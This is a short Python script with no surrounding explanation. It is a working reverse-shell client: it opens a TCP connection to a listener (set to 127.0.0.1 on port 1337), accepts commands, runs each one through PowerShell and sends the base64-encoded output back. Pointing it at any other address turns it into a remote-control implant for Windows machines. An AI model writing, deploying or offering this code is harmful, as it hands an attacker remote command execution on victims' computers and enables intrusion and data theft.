import socket
import base64
import os

HOST = "127.0.0.1"
PORT = 1337

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        command = s.recv(1024)
        if command:
            command = command.decode("utf-8").strip()
            out = os.popen("powershell " + command).read()
            out = base64.b64encode(bytes(out,"utf-8"))
            s.sendall(out)
        else:
            break